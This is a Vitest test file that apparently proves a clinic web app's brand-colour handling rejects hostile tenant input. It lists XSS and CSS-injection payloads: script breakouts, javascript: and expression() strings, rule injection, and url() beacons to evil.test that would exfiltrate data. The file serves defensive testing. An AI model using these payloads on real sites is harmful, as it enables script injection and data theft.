import { describe, expect, it } from 'vitest'
import { applyBrand } from './applyBrand'
import { brandStyle, tokensToStyle } from './brandStyle'
import { isFullyBranded, resolveBrandTokens } from './resolveBrandTokens'
import { BRAND_PROPERTIES, type BrandProperty, type TenantBranding } from './types'

/*
 * Acceptance criterion 5 of frontend-nextjs.md: "No tenant-supplied value can inject
 * markup, style or script. Covered by test with hostile inputs."
 *
 * brand.test.ts proves the shape of the guard on ONE property. This file is the criterion
 * itself: every hostile string, against every property the API can set, plus the two
 * structural claims that make the guard worth trusting.
 *
 * WHY IT IS WORTH DOING PROPERLY RATHER THAN ONCE. A clinic's colours are the one place
 * in this product where a tenant's own free-form text reaches the rendered page.
 * Everything else a clinic supplies is data the API has typed and bounded; a colour is a
 * string that becomes a CSS declaration. And the blast radius is not cosmetic: CSS on a
 * page that renders prescriptions can exfiltrate them — an attribute selector with a
 * `background: url(...)` leaks a value one character at a time — and a clinic
 * administrator is not a trusted operator, they are a customer with a colour picker.
 *
 * THE TESTS ASSERT TWO INDEPENDENT MECHANISMS, because either alone is a thinner promise:
 *
 *   1. VALIDATION. resolveBrandTokens accepts `^#[0-9A-Fa-f]{6}$` and nothing else. It is
 *      proved below by exhausting the shapes that are one character away from valid,
 *      never by reading the regex back — a test that asserted on the constant would still
 *      pass against a pattern that had quietly lost its anchors.
 *   2. NOWHERE TO GO. brandStyle returns an OBJECT, which React sets through the CSSOM. A
 *      string would mean concatenation into a <style> block or dangerouslySetInnerHTML,
 *      and then the validation would be the only thing between a tenant and a script tag.
 *      Because it is an object, a value that somehow got past (1) is still only ever a
 *      property VALUE — there is no declaration, no rule and no element to escape from.
 *
 * A note on what "nothing hostile survives" is asserted to MEAN here. Not "the output
 * contains no <script>": a deny-list of dangerous substrings is a list somebody has to
 * keep guessing at, and the payload that matters is the one nobody thought to add. The
 * assertion is that every value in the returned object is a six-digit hex triplet. That
 * is true or false with no room in between for a novel payload.
 *
 * @see docs/30-architecture/frontend-nextjs.md — acceptance criterion 5
 * @see docs/10-product/white-labeling-and-branding.md
 */

/** The API field behind each custom property, so a test can poison them one at a time. */
const FIELD: Record<BrandProperty, string> = {
  '--brand-primary': 'primary_colour',
  '--brand-primary-fg': 'primary_foreground',
  '--brand-secondary': 'secondary_colour',
  '--brand-secondary-fg': 'secondary_foreground',
  '--brand-surface': 'surface',
}

/** The same expression resolveBrandTokens uses, written out rather than imported. */
const HEX = /^#[0-9A-Fa-f]{6}$/

function branding(overrides: Record<string, unknown> = {}): TenantBranding {
  return {
    primary_colour: '#1B7F5A',
    primary_foreground: '#FFFFFF',
    secondary_colour: '#0A2540',
    secondary_foreground: '#FFFFFF',
    surface: '#F1F8F5',
    logo_url: null,
    ...overrides,
  } as unknown as TenantBranding
}

/** The same branding with one property replaced by something the attacker chose. */
function poison(property: BrandProperty, value: unknown): TenantBranding {
  return branding({ [FIELD[property]]: value })
}

/** Every property poisoned at once — the realistic case, since one form saves all five. */
function poisonAll(value: unknown): TenantBranding {
  return branding(Object.fromEntries(Object.values(FIELD).map((field) => [field, value])))
}

/**
 * The only thing that ever needs asserting about a token object.
 *
 * Stated as an allow-list, for the reason in the header: every surviving key is one of
 * the five documented properties, and every surviving value is a hex triplet.
 */
function everySurvivingValueIsAColour(tokens: object): void {
  for (const [property, value] of Object.entries(tokens)) {
    expect(BRAND_PROPERTIES, `${property} is not a brand property`).toContain(property)
    expect(value, `${property} carried something that is not a colour`).toMatch(HEX)
  }
}

/*
 * The corpus. Every entry is an attempt at a specific escape rather than decorative
 * nonsense — the five the acceptance criterion names, the ones that would matter the day
 * a value stopped travelling through the CSSOM, the shapes that sit one character away
 * from valid, the values that are not strings at all, and the ones that are simply
 * enormous.
 */
const HOSTILE: Array<[string, unknown]> = [
  // The five the acceptance criterion names.
  ['a closed style element and a script', '</style><script>alert(1)</script>'],
  ['a closed declaration and a replacement rule', 'red;}body{display:none'],
  ['a javascript: url', 'javascript:alert(1)'],
  ['a legacy IE expression', 'expression(alert(1))'],
  ['a url() wrapping a javascript: url', 'url(javascript:alert(1))'],

  // Escapes that would matter the day a value stopped going through the CSSOM.
  ['a valid colour with a rule glued to it', '#FF0000;}html{opacity:0'],
  ['a double-quote attribute escape', '#FF0000" onload="alert(1)'],
  ['a single-quote attribute escape', "#FF0000' onload='alert(1)"],
  ['an unterminated css comment', '#FF0000/*'],
  ['a closed css comment holding a rule', '#FF0000 /* } body { display:none } */'],
  ['an html comment', '#FF0000<!--'],
  ['an @import of a remote stylesheet', '@import url(https://evil.test/x.css)'],
  ['an exfiltrating background', '#FF0000; background: url(https://evil.test/beacon)'],
  ['a data: url carrying markup', 'data:text/html,<script>alert(1)</script>'],
  ['a css escape sequence spelling expression', '\\65 xpression(alert(1))'],
  ['a css-escaped hash', '\\23 FF0000'],
  ['an html entity for a hash', '&#35;FF0000'],
  ['an !important override', '#FF0000 !important'],
  ['a var() pointed at another token', 'var(--brand-primary-fg)'],
  ['a newline then a new rule', '#FF0000\n} html { opacity: 0 }'],
  ['a carriage return then a new rule', '#FF0000\r}html{opacity:0}'],
  ['a null byte', '#FF0000\u0000'],
  ['a right-to-left override', '#FF0000\u202E'],
  ['a zero-width space inside the digits', '#FF\u200B0000'],
  ['a form feed', '#FF0000\f'],

  // One character away from valid, which is where a loosened pattern lands first.
  ['a shorthand triplet', '#F00'],
  ['an eight-digit hex with alpha', '#FF0000FF'],
  ['a seven-digit hex', '#FF00000'],
  ['a five-digit hex', '#FF000'],
  ['non-hex letters', '#GGGGGG'],
  ['no hash at all', 'FF0000'],
  ['two hashes', '##FF000'],
  ['leading whitespace', ' #FF0000'],
  ['trailing whitespace', '#FF0000 '],
  ['a trailing newline', '#FF0000\n'],
  ['a colour keyword', 'red'],
  ['an rgb() function', 'rgb(255,0,0)'],
  ['fullwidth hex digits', '#ＦＦ００００'],
  ['arabic-indic digits', '#٦٦٦٦٦٦'],
  ['the empty string', ''],
  ['whitespace only', '   '],

  // Not strings at all. The type says `string | null`; this value arrives over HTTP, and
  // a type is a promise about compile time rather than about this particular byte string.
  ['a number', 0xff0000],
  ['a boolean', true],
  ['null', null],
  ['undefined', undefined],
  ['a bare object', {}],
  ['an array holding a valid colour', ['#FF0000']],
  ['a function returning a valid colour', () => '#FF0000'],
  ['an object whose toString is a valid colour', { toString: () => '#FF0000' }],
  ['a boxed string', Object('#FF0000')],
  ['a nested branding block', { primary_colour: '#FF0000' }],

  // Absurdly long. The pattern is anchored and has no repeated group, so it cannot
  // backtrack — this is the check that it stays that way, because an unanchored rewrite
  // would turn a colour field into a denial of service against the render itself. There
  // is no timing assertion here: the test timeout is the assertion.
  ['a megabyte of hex digits', `#${'F'.repeat(1_000_000)}`],
  ['a valid colour followed by a megabyte', `#FF0000${'A'.repeat(1_000_000)}`],
  ['a valid colour repeated a hundred thousand times', '#FF0000'.repeat(100_000)],
  ['a megabyte of newlines then a rule', `${'\n'.repeat(1_000_000)}}html{opacity:0}`],
]

describe('resolveBrandTokens, against hostile input', () => {
  it.each(HOSTILE)('refuses %s, in one field and in all five', (_name, value) => {
    for (const property of BRAND_PROPERTIES) {
      const tokens = resolveBrandTokens(poison(property, value))

      expect(tokens[property], `${property} accepted a hostile value`).toBeUndefined()
      everySurvivingValueIsAColour(tokens)
      expect(isFullyBranded(tokens)).toBe(false)
      // The other four were valid and stay: a hostile value in one field is not a reason
      // to drop a colour the clinic set correctly.
      expect(Object.keys(tokens)).toHaveLength(BRAND_PROPERTIES.length - 1)
    }

    // The realistic shape, since one form saves the whole palette: a tenant who can
    // poison one field can poison every field.
    const nothing = resolveBrandTokens(poisonAll(value))

    expect(nothing).toEqual({})
    expect(JSON.stringify(nothing)).toBe('{}')
    expect(isFullyBranded(nothing)).toBe(false)
  })

  it('accepts a six-digit triplet in either case, and nothing one character away', () => {
    /*
     * The mechanism, proved by exhaustion rather than by reading the constant. A test
     * that asserted `HEX.source === '^#[0-9a-fA-F]{6}$'` would still pass if the anchors
     * were lost in a refactor, because it would be comparing the pattern to itself.
     *
     * Both cases are accepted deliberately: the backend's BrandPalette emits uppercase,
     * and an administrator pasting `#1b7f5a` out of a design tool is not an attack.
     */
    for (const accepted of ['#000000', '#FFFFFF', '#1B7F5A', '#1b7f5a', '#aAbBcC', '#012345']) {
      expect(
        resolveBrandTokens(branding({ primary_colour: accepted }))['--brand-primary'],
        `${accepted} is a colour and was refused`,
      ).toBe(accepted)
    }

    for (const refused of ['#00000', '#0000000', '#00000g', '0#00000', '#00000\t', '#00 000']) {
      expect(
        resolveBrandTokens(branding({ primary_colour: refused }))['--brand-primary'],
        `${JSON.stringify(refused)} was accepted`,
      ).toBeUndefined()
    }
  })

  it('reads only the five documented fields, so an extra one cannot become a token', () => {
    /*
     * The property list is the ENTIRE surface a clinic can influence: colours and a logo,
     * and nothing that could carry CSS, markup or a font choice. That absence is the
     * control rather than an omission, so an API that grew a field — or a tenant who
     * posted one — must not be able to add a custom property to the document.
     */
    const tokens = resolveBrandTokens(
      branding({
        '--brand-primary': 'red',
        '--brand-evil': '#FF0000',
        'font-family': 'url(https://evil.test/f.woff2)',
        background: 'url(https://evil.test/beacon)',
        content: '"</style>"',
      }),
    )

    expect(Object.keys(tokens).sort()).toEqual([...BRAND_PROPERTIES].sort())
    expect(Object.keys(tokens)).not.toContain('--brand-evil')
    everySurvivingValueIsAColour(tokens)
  })
})

describe('brandStyle, against hostile input', () => {
  it('hands React an object, not a string, so there is nothing to break out of', () => {
    /*
     * THE STRUCTURAL GUARANTEE, and the reason this is more than "we validated it".
     *
     * React applies a style object through the CSSOM: each entry becomes a property name
     * and a property value, set individually. A value therefore cannot end a declaration,
     * close a <style> element or open a tag, because at no point is it part of a string
     * that contains any of those things. Return a string here instead and every one of
     * those becomes possible again the moment the validation has a gap.
     *
     * Asserted on the type, because it is the type that is load-bearing.
     */
    const style = brandStyle(branding())

    expect(typeof style).toBe('object')
    expect(style).not.toBeNull()
    expect(Array.isArray(style)).toBe(false)

    for (const value of Object.values(style)) {
      expect(typeof value).toBe('string')
      expect(value).toMatch(HEX)
    }
  })

  it('carries no hostile value through, in any field or in all of them', () => {
    // brandStyle is resolveBrandTokens under another name, and this asserts that it stays
    // that way. A future brandStyle that "helpfully" added a fallback, or merged the
    // caller's own style object, would land here.
    for (const [name, value] of HOSTILE) {
      for (const property of BRAND_PROPERTIES) {
        const style = brandStyle(poison(property, value))

        expect(style[property], `${property} accepted ${name}`).toBeUndefined()
        everySurvivingValueIsAColour(style)
      }

      expect(brandStyle(poisonAll(value)), `all five accepted ${name}`).toEqual({})
    }
  })

  it('is empty for a tenant with no branding at all', () => {
    // The unbranded tenant and the wholly-hostile one are indistinguishable in the output,
    // which is the point: both render in the stylesheet's own fallback colours.
    expect(brandStyle(null)).toEqual({})
    expect(brandStyle(undefined)).toEqual({})
  })

  it('copies rather than aliases, so a caller cannot edit the token object', () => {
    // tokensToStyle exists for a caller that already resolved. If it handed back the same
    // object, one component could mutate the tokens another is about to render.
    const tokens = resolveBrandTokens(branding())
    const style = tokensToStyle(tokens)

    expect(style).toEqual(tokens)
    expect(style).not.toBe(tokens)

    style['--brand-primary'] = 'red'

    expect(tokens['--brand-primary']).toBe('#1B7F5A')
  })
})

describe('applyBrand, against hostile input', () => {
  function recordingRoot() {
    const set = new Map<string, string>()
    const removed: string[] = []

    return {
      element: {
        style: {
          setProperty: (key: string, value: string) => void set.set(key, value),
          removeProperty: (key: string) => {
            removed.push(key)
            set.delete(key)
          },
        },
      } as unknown as HTMLElement,
      applied: () => Object.fromEntries(set),
      removed: () => removed,
    }
  }

  it('never puts a hostile value on the document', () => {
    for (const [name, value] of HOSTILE) {
      const root = recordingRoot()

      const applied = applyBrand(poisonAll(value), root.element)

      expect(applied, `applied something for ${name}`).toBe(0)
      expect(root.applied(), `set something for ${name}`).toEqual({})
      // Not merely "did not set it": every refused property is explicitly removed, so a
      // hostile save cannot leave a previous tenant's colours standing either.
      expect(root.removed().sort()).toEqual([...BRAND_PROPERTIES].sort())
    }
  })

  it('clears a property whose new value is hostile rather than keeping the old one', () => {
    /*
     * The sequence that matters inside one long-lived document: an administrator
     * previewing a palette, or a client-side navigation between tenants. A valid colour is
     * set, then the value changes to something refused. Leaving the old value would mean
     * the page keeps rendering a colour nobody has configured — and would make "applied
     * zero properties" and "the document is unbranded" stop meaning the same thing.
     */
    const root = recordingRoot()

    expect(applyBrand(branding(), root.element)).toBe(5)
    expect(root.applied()['--brand-primary']).toBe('#1B7F5A')

    expect(applyBrand(poison('--brand-primary', 'red;}body{display:none'), root.element)).toBe(4)
    expect(root.applied()['--brand-primary']).toBeUndefined()
    everySurvivingValueIsAColour(root.applied())
  })

  it('sets only hex triplets, whatever the mix of good and hostile', () => {
    const root = recordingRoot()

    const applied = applyBrand(
      branding({
        primary_colour: '#1B7F5A',
        primary_foreground: '</style><script>alert(1)</script>',
        secondary_colour: 'url(javascript:alert(1))',
        secondary_foreground: '#FFFFFF',
        surface: 'expression(alert(1))',
      }),
      root.element,
    )

    expect(applied).toBe(2)
    expect(Object.keys(root.applied()).sort()).toEqual([
      '--brand-primary',
      '--brand-secondary-fg',
    ])
    everySurvivingValueIsAColour(root.applied())
  })
})
